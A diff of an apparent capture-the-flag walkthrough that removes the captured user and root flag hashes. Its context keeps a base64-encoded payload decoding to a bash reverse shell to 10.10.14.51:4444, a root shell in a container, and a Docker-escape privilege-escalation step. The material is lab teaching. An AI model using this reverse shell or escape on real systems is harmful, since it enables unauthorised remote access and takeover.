@@ -125,7 +125,7 @@ PAYLOAD BASE64 >> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MS80NDQ0ID
 [+]P0WN3ED[+]
 root@3a453ab39d3d:/home/augustus# cat user.txt
 cat user.txt
-5f13d28eb7e3d67bc5f3e9968004aaf1
+
 
 [+]PRIVILAGE ESCALATION[+] DOCKER
 We need escape the docker container.
@@ -174,4 +174,4 @@ bash-5.1# whoami
 root
 
 bash-5.1# cat /root/root.txt
-d2aed550865b663828abf36e330a90b8
+
